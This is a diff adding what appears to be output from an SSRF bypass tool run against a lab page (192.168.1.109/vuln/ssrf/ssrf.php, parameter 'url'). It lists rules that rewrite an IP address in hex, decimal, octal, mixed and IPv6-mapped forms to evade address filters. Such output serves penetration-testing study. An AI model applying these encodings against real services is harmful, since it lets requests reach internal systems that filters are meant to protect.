@@ -1,0 +1,10 @@
+[+]url: http://192.168.1.109/vuln/ssrf/ssrf.php
+[+]parameter: url
+[+]available rule: HEX_SINGLE(ipFrag3,"yes") + "." + HEX_SINGLE(ipFrag2,"yes") + "." + HEX_SINGLE(ipFrag1,"yes") + "." + HEX_SINGLE(ipFrag0,"yes")
+[+]available rule: str(DECIMAL_SINGLE(ipFrag3,3) + DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
+[+]available rule: OCT_SINGLE(ipFrag3) + "." + OCT_SINGLE(ipFrag2) + "." + OCT_SINGLE(ipFrag1) + "." + OCT_SINGLE(ipFrag0)
+[+]available rule: '[::ffff:' + ipFrag3 + "." + ipFrag2 + "." + ipFrag1 + "." + ipFrag0 + ']'
+[+]available rule: HEX_SINGLE(ipFrag3,"yes") + "." + OCT_SINGLE(ipFrag2) + "." + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
+[+]available rule: HEX_SINGLE(ipFrag3,"yes") + "." + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
+[+]available rule:  '0' + OCT_SINGLE(ipFrag3) + "." + str(DECIMAL_SINGLE(ipFrag2,2) + DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
+[+]available rule: '0' + OCT_SINGLE(ipFrag3) + "." + HEX_SINGLE(ipFrag2,"yes") + "." + str(DECIMAL_SINGLE(ipFrag1,1) + DECIMAL_SINGLE(ipFrag0,0))
